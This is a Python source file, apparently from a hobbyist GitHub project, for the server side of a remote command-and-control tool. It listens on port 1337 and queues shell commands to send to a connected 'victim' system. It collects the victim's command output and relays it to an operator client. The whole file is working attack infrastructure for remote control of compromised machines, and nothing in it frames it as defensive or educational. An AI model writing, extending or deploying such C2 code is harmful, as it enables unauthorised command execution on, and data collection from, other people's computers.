import socket
import time
#Bind the server to a port and an IP address
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Replace with your IP
sock.bind(("0.0.0.0", 1337))
sock.listen(10)
#You can enter default commands to be sent when the victim connects here
command_backlog = ["ls"]
#List for outputs received from victim to be trasferred to the host
output_backlog = []
#Is there an active connection?
conn = False
#Is the connected device the client/host?
isHost = False

#Print Silly Rabbit
ascii_art = '''
                    ____     ____
                  /'    |   |    \ 
                /    /  |   | \   \ 
              /    / |  |   |  \   \ 
             (   /   |  """"   |\   \   
             | /   / /^\    /^\  \  _|
              ~   | |   |  |   | | ~
                  | |__O|__|O__| |
                /~~      \/     ~~\ 
               /   (      |      )  \ 
               /,   \____/^\___/'   \ 
                / -____-|_|_|-____-\ 
           _____|_/~~~~\____/~~~~\__|_____
          |____|_|     |____|     |__|____|
              | `^-^-^'    `^-^-^'    |
              |                       |    Program Created By:
              |     "Silly Rabbit,    |  github.com/Kaiden-cyber
              |                       |
              |  Root is for Admins!" |
              |                       |
              |                       |
              |                       |
              |                       |
               -----------------------'''
print(ascii_art)

while True:
    if conn is False:
        #When the host disconnects this makes sure that the variable gets reset
        isHost = False
        #Wait for someone to connect
        print("Waiting for connection")
        conn, client = sock.accept()
        #Print out information about the newly connected device
        print('Connection from:', client)
    else:
        #This code executed when there is a host connected
        #All delays in this section are to avoid accidentially sending 2 outputs in one
        received = conn.recv(1024)
        received_message = received.decode("utf-8")
        print(received_message)
        if received_message == "Connected from host":
            #We have received the indication that the device is running the Client.py file
            isHost = True
            print("Sending Backlog...")
            #Notify the client how many outputs we will be sending
            conn.send(str.encode(str(len(output_backlog))))
            #Delay next message
            time.sleep(0.1)
            for output in output_backlog:
                #Send the next output captured in the list
                conn.send(str.encode(str(output)))
                #Delay next message
                time.sleep(0.1)
            #We have sent all of the list so we need to empty it
            output_backlog = []
            print("Backlog sent!")
            #Delay next message
            time.sleep(0.1)
            #The Client sends if they are going to be sending commands to then be sent to the victim
            exit_msg = conn.recv(1024).decode("utf-8")
            if exit_msg == "Sending Commands":
                #Recive the number of commands being sent from the client
                num_commands = int(conn.recv(1024).decode("utf-8"))
                #receive the commands
                for i in range(num_commands):
                    command = conn.recv(1024).decode("utf-8")
                    #For debugging purposes the server logs each command that gets sent to it
                    print("Got Command: " + command)
                    #Add the sent command to the backlog
                    command_backlog.append(command)
            #terminate the connection after all commands have been sent
            conn = False
            continue
        #A blank message is sent when the victim/client terminates the session and we need to catch that so that 
        #the server doesnt error out trying to get a message from a host that isn't connected
        elif received_message == "":
            conn = False
            continue
        #This means that the victim is sending us output to be logged
        elif received_message != "Connected from Victim's System":
            output_backlog.append(received_message)
        #Probably does nothing but im not going to touch it
        elif isHost:
            command_backlog.append(received_message)
        #Notify the victim how many commands we will be sending to execute
        else:
            conn.send(str.encode(str(len(command_backlog))))
            time.sleep(0.1)
        #prints all other received messages
        print("[RECEIVED]: " + received_message)
        #send the victim all of the commands and put the output in the backlog
        for i in command_backlog:
            conn.send(str.encode(i))
            print("Sent command: " + i)
            #Ran out of variable names ;-;
            thing = conn.recv(1024).decode("utf-8")
            output_backlog.append(thing)
        #After all commands get sent reset the backlog
        command_backlog = []
        #Disconnect and wait for another connection
        conn = False
        continue
